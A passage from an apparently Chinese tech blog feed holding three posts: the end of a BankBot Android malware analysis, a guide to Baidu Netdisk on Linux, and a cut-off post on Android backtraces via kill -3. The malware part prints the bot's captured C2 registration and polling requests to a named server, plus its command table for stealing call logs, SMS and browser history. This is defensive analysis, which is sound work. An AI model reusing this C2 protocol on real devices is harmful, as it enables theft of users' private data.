class="hljs-operator">=</span> <span class="hljs-string">&quot;status&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_URL_TO_SHOW</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;url&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_VERSION</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;version&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="请求注册"><a href="#请求注册" class="headerlink" title="请求注册"></a>请求注册</h3><p>返回报文</p><p>401</p><h3 id="注册报文"><a href="#注册报文" class="headerlink" title="注册报文"></a>注册报文</h3><p>请求报文</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/p/gate.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>106<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>quick-sshopping.com<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Keep-Alive<br><br><span class="language-apache"><span class="hljs-attribute">action</span>=reg&amp;imei=<span class="hljs-number">098767899076562</span>&amp;phone=<span class="hljs-number">15802920457</span>&amp;op=Android&amp;version=<span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">4</span>%<span class="hljs-number">2</span>C3.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-gd853d22&amp;prefix=<span class="hljs-number">12</span>Jhw21</span><br></code></pre></td></tr></table></figure><p>响应报文</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx/1.8.0<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Tue, 23 Feb 2016 07:25:21 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/5.5.31<br><br>3<br>200<br>0<br><br><br></code></pre></td></tr></table></figure><h3 id="获取命令"><a href="#获取命令" class="headerlink" title="获取命令"></a>获取命令</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/p/gate.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>32<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>quick-sshopping.com<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Keep-Alive<br><br><span class="language-ini"><span class="hljs-attr">action</span>=poll&amp;imei=<span class="hljs-number">098767899076562</span></span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx/1.8.0<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Tue, 23 Feb 2016 07:25:30 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/5.5.31<br><br>0<br><br><br></code></pre></td></tr></table></figure><p>返回的命令为json 格式，主要的指令有下面几个，</p><table><thead><tr><th>指令</th><th>含义</th></tr></thead><tbody><tr><td>401</td><td>要求 bot 注册</td></tr><tr><td>call_log</td><td>获取电话记录, 发送到C&amp;C server</td></tr><tr><td>sms_history</td><td>获取短信内容，发送到C&amp;C server</td></tr><tr><td>browser_history</td><td>获取浏览器书签，发送到C&amp;C server</td></tr><tr><td>url</td><td>访问url 链接</td></tr><tr><td>server</td><td>更换C&amp;C server</td></tr><tr><td>intercept</td><td></td></tr><tr><td>server_poll</td><td>更新从服务器获取命令的时间间隔</td></tr><tr><td>mayhem</td><td></td></tr><tr><td>calls</td><td></td></tr></tbody></table><p>监视服务了大半天，没有收到有效指令，看来不是特别活跃。</p><h2 id="0x03清除"><a href="#0x03清除" class="headerlink" title="0x03清除"></a>0x03清除</h2><p>这个App的清除非常费劲，原因就是注册为设备管理器的app不能卸载，而这个App又使诈<br>不让我们取消设备管理器，估计只有root的机器会好处理一些。</p><h2 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h2><p>BankBot 样本，代码编写的相当规范，风格严谨，是正规程序员的作品。但行为非常流氓，<br>很顽固，不容易清除。所以遇到申请device admin 权限的程序一定要小心谨慎，以免不良<br>后果。而Android的界面劫持也是一个严重的问题，估计后续利用这些技术的恶意App的数量<br>会越来越多。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>Malware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux 下使用百度网盘</title>
    <link href="/cn/BaiduNetdisk/"/>
    <url>/cn/BaiduNetdisk/</url>
    
    <content type="html"><![CDATA[<p>百度网盘在国内很大概率是绕不过去，稍大点文件都喜欢用百度网盘给下载地址。可是百度网盘下载<br>是限速的，而且对 Linux 用户非常不友好，我的 Fedora 装上 rpm 包也用不了，直接崩溃，所以得想点其他办法。</p><h3 id="1-官方安装包-（不一定都能使用）"><a href="#1-官方安装包-（不一定都能使用）" class="headerlink" title="1. 官方安装包 （不一定都能使用）"></a>1. 官方安装包 （不一定都能使用）</h3><p>官方提供了 deb 和 rpm 格式安装包</p><p><a href="http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.rpm">http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.rpm</a><br><a href="http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.deb">http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.deb</a></p><p>但是在 Fedora 安装后，会报错误。</p><h3 id="2-BaiduPCS-Go-（百度网盘客户端-Go语言编写）"><a href="#2-BaiduPCS-Go-（百度网盘客户端-Go语言编写）" class="headerlink" title="2. BaiduPCS-Go （百度网盘客户端 - Go语言编写）"></a>2. BaiduPCS-Go （百度网盘客户端 - Go语言编写）</h3><p><a href="https://github.com/iikira/BaiduPCS-Go">https://github.com/iikira/BaiduPCS-Go</a></p><h4 id="2-1-登录"><a href="#2-1-登录" class="headerlink" title="2.1 登录"></a>2.1 登录</h4><p>.&#x2F;BaiduPCS-Go login -bduss&#x3D;xxxxx</p><h4 id="2-2-设置并发"><a href="#2-2-设置并发" class="headerlink" title="2.2 设置并发"></a>2.2 设置并发</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&gt;<span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> <span class="hljs-attribute">-max_parallel</span>=50<br></code></pre></td></tr></table></figure><h4 id="2-3-下载"><a href="#2-3-下载" class="headerlink" title="2.3 下载"></a>2.3 下载</h4><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">download xxxxx</span><br></code></pre></td></tr></table></figure><h3 id="3-使用浏览器插件"><a href="#3-使用浏览器插件" class="headerlink" title="3. 使用浏览器插件"></a>3. 使用浏览器插件</h3><p><a href="https://github.com/acgotaku/BaiduExporter.git">https://github.com/acgotaku/BaiduExporter.git</a></p><p>可以直接使用作者提供的打包好的插件, 直接安装即可。</p><p><a href="https://github.com/acgotaku/BaiduExporter/blob/master/BaiduExporter.crx">https://github.com/acgotaku/BaiduExporter/blob/master/BaiduExporter.crx</a></p><p>这个插件将使用 aria2c 下载，使用得先准备一个可以使用的aria2c<br>要让 aria2c 更好用一些，可以修改一下配置，配置文件可以参考</p><p><a href="https://raw.githubusercontent.com/acgotaku/BaiduExporter/master/aria2c/aria2.conf">https://raw.githubusercontent.com/acgotaku/BaiduExporter/master/aria2c/aria2.conf</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android 获取进程的 backtrace 信息</title>
    <link href="/cn/backtrace_in_android/"/>
    <url>/cn/backtrace_in_android/</url>
    
    <content type="html"><![CDATA[<h2 id="☆-使用kill-发送-SIGNAL-QUIT"><a href="#☆-使用kill-发送-SIGNAL-QUIT" class="headerlink" title="☆ 使用kill 发送 SIGNAL_QUIT"></a>☆ 使用kill 发送 SIGNAL_QUIT</h2><p>这种方法只能用于zygote 的子进程 (比如所有的 app 进程, 都是由zygote fork 而来).</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># kill -3 pid</span><br><br><span class="hljs-comment"># cat /data/anr/traces.txt</span><br><br><span class="hljs-built_in">..</span>.<br><br>suspend all histogram:  Sum: 290us 99% C.I. 2us-40us Avg: 14.500us Max: 40us<br>DALVIK THREADS (12):<br><span class="hljs-string">&quot;Signal Catcher&quot;</span> daemon <span class="hljs-attribute">prio</span>=5 <span class="hljs-attribute">tid</span>=2 Runnable<br>  | <span class="hljs-attribute">group</span>=<span class="hljs-string">&quot;system&quot;</span> <span class="hljs-attribute">sCount</span>=0 <span class="hljs-attribute">dsCount</span>=0 <span class="hljs-attribute">obj</span>=0x32c070a0 <span class="hljs-attribute">self</span>=0xaecca000<br>  | <span class="hljs-attribute">sysTid</span>=1918 <span class="hljs-attribute">nice</span>=0 <span class="hljs-attribute">cgrp</span>=bg_non_interactive <span class="hljs-attribute">sched</span>=0/0 <span class="hljs-attribute">handle</span>=0xb4406930<br>  | <span class="hljs-attribute">state</span>=R schedstat=( 228351607 17443703 83 ) <span class="hljs-attribute">utm</span>=12 <span class="hljs-attribute">stm</span>=9 <span class="hljs-attribute">core</span>=0 <span class="hljs-attribute">HZ</span>=100<br>  | <span class="hljs-attribute">stack</span>=0xb430a000-0xb430c000 <span class="hljs-attribute">stackSize</span>=1014KB<br>  | held mutexes= <span class="hljs-string">&quot;mutator lock&quot;</span>(shared held)<br>  native: #00 pc 00370e01  /system/lib/libart.so (_ZN3art15DumpNativeStackERNSt3__113basic_ostreamIcNS0_11char_traitsIcEEEEiPKcPNS_9ArtMethodEPv+160)<br>  native: #01 pc 0035046f  /system/lib/libart.so (_ZNK3art6Thread4DumpERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+150)<br>  native: #02 pc 0035a373  /system/lib/libart.so (_ZN3art14DumpCheckpoint3RunEPNS_6ThreadE+442)<br>  native: #03 pc 0035af31  /system/lib/libart.so (_ZN3art10ThreadList13RunCheckpointEPNS_7ClosureE+212)<br>  native: #04 pc 0035b45f  /system/lib/libart.so (_ZN3art10ThreadList4DumpERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+142)<br>  native: #05 pc 0035bb6f  /system/lib/libart.so (_ZN3art10ThreadList14DumpForSigQuitERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+334)<br>  native: #06 pc 00333cb7  /system/lib/libart.so (_ZN3art7Runtime14DumpForSigQuitERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+74)<br>  native: #07 pc 0033b01d  /system/lib/libart.so (_ZN3art13SignalCatcher13HandleSigQuitEv+928)<br>  native: #08 pc 0033b901  /system/lib/libart.so (_ZN3art13SignalCatcher3RunEPv+340)<br>  native: #09 pc 0003f45f  /system/lib/libc.so (_ZL15__pthread_startPv+30)<br>  native: #10 pc 00019b43  /system/lib/libc.so (__start_thread+6)<br>  (<span class="hljs-literal">no</span> managed stack frames)<br><br><span class="hljs-string">&quot;main&quot;</span> <span class="hljs-attribute">prio</span>=5 <span class="hljs-attribute">tid</span>=1 Native<br>  | <span class="hljs-attribute">group</span>=<span class="hljs-string">&quot;main&quot;</span> <span class="hljs-attribute">sCount</span>=1 <span class="hljs-attribute">dsCount</span>=0 <span class="hljs-attribute">obj</span>=0x74abb2a0 <span class="hljs-attribute">self</span>=0xb4d76500<br>  | <span class="hljs-attribute">sysTid</span>=1914 <span class="hljs-attribute">nice</span>=0 <span class="hljs-attribute">cgrp</span>=bg_non_interactive <span class="hljs-attribute">sched</span>=0/0 <span class="hljs-attribute">handle</span>=0xb6f3fb34<br>  | <span class="hljs-attribute">state</span>=S schedstat=( 76934470 21396828 203 ) <span class="hljs-attribute">utm</span>=3 <span class="hljs-attribute">stm</span>=3 <span class="hljs-attribute">core</span>=0 <span class="hljs-attribute">HZ</span>=100<br>  | <span class="hljs-attribute">stack</span>=0xbe55e000-0xbe560000 <span class="hljs-attribute">stackSize</span>=8MB<br>  | held mutexes=<br>  native: #00 pc 00040894  /system/lib/libc.so (__epoll_pwait+20)<br>  native: #01 pc 00019e6f  /system/lib/libc.so (epoll_pwait+26)<br><br>  <span class="hljs-built_in">..</span>.<br><br></code></pre></td></tr></table></figure><p>结果写在 &#x2F;data&#x2F;anr&#x2F;traces.txt 文件中, anr 是 ANR(Application Not Response)的意思.</p><p><a href="https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/runtime.cc">https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/runtime.cc</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Runtime::InitNonZygoteOrPostFork</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    JNIEnv* env, <span class="hljs-type">bool</span> is_system_server, NativeBridgeAction action, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* isa)</span> </span>&#123;<br><br>...<br><br>  <span class="hljs-comment">// Create the thread pools.</span><br>  heap_-&gt;<span class="hljs-built_in">CreateThreadPool</span>();<br>  <span class="hljs-comment">// Reset the gc performance data at zygote fork so that the GCs</span><br>  <span class="hljs-comment">// before fork aren&#x27;t attributed to an app.</span><br>  heap_-&gt;<span class="hljs-built_in">ResetGcPerformanceInfo</span>();<br>  <span class="hljs-keyword">if</span> (!is_system_server &amp;&amp;<br>      !safe_mode_ &amp;&amp;<br>      (jit_options_-&gt;<span class="hljs-built_in">UseJitCompilation</span>() || jit_options_-&gt;<span class="hljs-built_in">GetSaveProfilingInfo</span>()) &amp;&amp;<br>      jit_.<span class="hljs-built_in">get</span>() == <span class="hljs-literal">nullptr</span>) &#123;<br>    <span class="hljs-comment">// Note that when running ART standalone (not zygote, nor zygote fork),</span><br>    <span class="hljs-comment">// the jit may have already been created.</span><br>    <span class="hljs-built_in">CreateJit</span>();<br>  &#125;<br>  <span class="hljs-built_in">StartSignalCatcher</span>();<br>  <span class="hljs-comment">// Start the JDWP thread. If the command-line debugger flags specified &quot;suspend=y&quot;,</span><br>  <span class="hljs-comment">// this will pause the runtime, so we probably want this to come last.</span><br>  Dbg::<span class="hljs-built_in">StartJdwp</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出非zygote的进程都会启动 Signal Catcher的 线程.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@shamu:/ # ps -t <span class="hljs-number">2089</span><br><span class="hljs-attribute">USER</span>      PID   PPID  VSIZE  RSS   WCHAN            PC  NAME<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2089</span>  <span class="hljs-number">386</span>   <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> SyS_epoll_ b6cb0894 S com.hujiang.dict:pushservice<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2092</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> do_sigtime b6cb0b68 S Signal Catcher<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2095</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> unix_strea b6cb194c S JDWP<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2096</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> futex_wait b6c875e8 S ReferenceQueueD<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2097</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> futex_wait b6c875e8 S FinalizerDaemon<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2099</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> futex_wait b6c875e8 S FinalizerWatchd<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2100</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> futex_wait b6c875e8 S HeapTaskDaemon<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2101</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> binder_thr b6cb09c0 S Binder_1<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2102</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> binder_thr b6cb09c0 S Binder_2<br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2107</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> SyS_epoll_ b6cb0894 S Thread-<span class="hljs-number">123</span><br><span class="hljs-attribute">u0_a58</span>    <span class="hljs-number">2108</span>  <span class="hljs-number">2089</span>  <span class="hljs-number">1565280</span> <span class="hljs-number">53732</span> futex_wait b6c875e8 S taskService-pro<br><br><span class="hljs-attribute">zygote</span> 自己没有该线程.<br><br><span class="hljs-attribute">root</span>@shamu:/ # ps | grep -i zy<br><span class="hljs-attribute">root</span>      <span class="hljs-number">386</span>   <span class="hljs-number">1</span>     <span class="hljs-number">1528448</span> <span class="hljs-number">67416</span> poll_sched b6cb0a5c S zygote<br><br><span class="hljs-attribute">127</span>|root@shamu:/ # ps -t <span class="hljs-number">386</span><br><span class="hljs-attribute">USER</span>      PID   PPID  VSIZE  RSS   WCHAN            PC  NAME<br><span class="hljs-attribute">root</span>      <span class="hljs-number">386</span>   <span class="hljs-number">1</span>     <span class="hljs-number">1528448</span> <span class="hljs-number">67416</span> poll_sched b6cb0a5c S zygote<br><span class="hljs-attribute">root</span>      <span class="hljs-number">2203</span>  <span class="hljs-number">386</span>   <span class="hljs-number">1528448</span> <span class="hljs-number">67416</span> futex_wait b6c875e8 S ReferenceQueueD<br><span class="hljs-attribute">root</span>      <span class="hljs-number">2204</span>  <span class="hljs-number">386</span>   <span class="hljs-number">1528448</span> <span class="hljs-number">67416</span> futex_wait b6c875e8 S FinalizerDaemon<br><span class="hljs-attribute">root</span>      <span class="hljs-number">2205</span>  <span class="hljs-number">386</span>   <span class="hljs-number">1528448</span> <span class="hljs-number">67416</span> futex_wait b6c875e8 S FinalizerWatchd<br><span class="hljs-attribute">root</span>      <span class="hljs-number">2206</span>  <span class="hljs-number">386</span>   <span class="hljs-number">1528448</span> <span class="hljs-number">67416</span> futex_wait b6c875e8 S HeapTaskDaemon<br><br></code></pre></td></tr></table></figure><p><a href="https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/signal_catcher.cc">https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/signal_catcher.cc</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs cpp">...<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SignalCatcher::Output</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; s)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (stack_trace_file_.<span class="hljs-built_in">empty</span>()) &#123;<br>    <span class="hljs-built_in">LOG</span>(INFO) &lt;&lt; s;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>...<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SignalCatcher::HandleSigQuit</span><span class="hljs-params">()</span> </span>&#123;<br>  Runtime* runtime = Runtime::<span class="hljs-built_in">Current</span>();<br>  std::ostringstream os;<br>  os &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span><br>      &lt;&lt; <span class="hljs-string">&quot;----- pid &quot;</span> &lt;&lt; <span class="hljs-built_in">getpid</span>() &lt;&lt; <span class="hljs-string">&quot; at &quot;</span> &lt;&lt; <span class="hljs-built_in">GetIsoDate</span>() &lt;&lt; <span class="hljs-string">&quot; -----\n&quot;</span>;<br>  <span class="hljs-built_in">DumpCmdLine</span>(os);<br>  <span class="hljs-comment">// Note: The strings &quot;Build fingerprint:&quot; and &quot;ABI:&quot; are chosen to match the format used by</span><br>  <span class="hljs-comment">// debuggerd. This allows, for example, the stack tool to work.</span><br>  std::string fingerprint = runtime-&gt;<span class="hljs-built_in">GetFingerprint</span>();<br>  os &lt;&lt; <span class="hljs-string">&quot;Build fingerprint: &#x27;&quot;</span> &lt;&lt; (fingerprint.<span class="hljs-built_in">empty</span>() ? <span class="hljs-string">&quot;unknown&quot;</span> : fingerprint) &lt;&lt; <span class="hljs-string">&quot;&#x27;\n&quot;</span>;<br>  os &lt;&lt; <span class="hljs-string">&quot;ABI: &#x27;&quot;</span> &lt;&lt; <span class="hljs-built_in">GetInstructionSetString</span>(runtime-&gt;<span class="hljs-built_in">GetInstructionSet</span>()) &lt;&lt; <span class="hljs-string">&quot;&#x27;\n&quot;</span>;<br>  os &lt;&lt; <span class="hljs-string">&quot;Build type: &quot;</span> &lt;&lt; (kIsDebugBuild ? <span class="hljs-string">&quot;debug&quot;</span> : <span class="hljs-string">&quot;optimized&quot;</span>) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>  runtime-&gt;<span class="hljs-built_in">DumpForSigQuit</span>(os);<br>  <span class="hljs-keyword">if</span> ((<span class="hljs-literal">false</span>)) &#123;<br>    std::string maps;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ReadFileToString</span>(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>, &amp;maps)) &#123;<br>      os &lt;&lt; <span class="hljs-string">&quot;/proc/self/maps:\n&quot;</span> &lt;&lt; maps;<br>    &#125;<br>  &#125;<br>  os &lt;&lt; <span class="hljs-string">&quot;----- end &quot;</span> &lt;&lt; <span class="hljs-built_in">getpid</span>() &lt;&lt; <span class="hljs-string">&quot; -----\n&quot;</span>;<br>  <span class="hljs-built_in">Output</span>(os.<span class="hljs-built_in">str</span>());<br>&#125;<br><br>...<br><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-type">int</span> signal_number = signal_catcher-&gt;<span class="hljs-built_in">WaitForSignal</span>(self, signals);<br>    <span class="hljs-keyword">if</span> (signal_catcher-&gt;<span class="hljs-built_in">ShouldHalt</span>()) &#123;<br>      runtime-&gt;<span class="hljs-built_in">DetachCurrentThread</span>();<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    &#125;<br>    <span class="hljs-keyword">switch</span> (signal_number) &#123;<br>    <span class="hljs-keyword">case</span> SIGQUIT:<br>      signal_catcher-&gt;<span class="hljs-built_in">HandleSigQuit</span>();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> SIGUSR1:<br>      signal_catcher-&gt;<span class="hljs-built_in">HandleSigUsr1</span>();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">LOG</span>(ERROR) &lt;&lt; <span class="hljs-string">&quot;Unexpected signal %d&quot;</span> &lt;&lt; signal_number;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>...<br><br></code></pre></td></tr></table></figure><p>从源码中发现除了SIGQUIT 还可以发送 SIGUSR1 , 这个信号可以使进程java 虚拟机执行GC<br>操作 <code>kill -10 pid</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SignalCatcher::HandleSigUsr1</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-built_in">LOG</span>(INFO) &lt;&lt; <span class="hljs-string">&quot;SIGUSR1 forcing GC (no HPROF)&quot;</span>;<br>  Runtime::<span class="hljs-built_in">Current</span>()-&gt;<span class="hljs-built_in">GetHeap</span>()-&gt;<span class="hljs-built_in">CollectGarbage</span>(<span class="hljs-literal">false</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 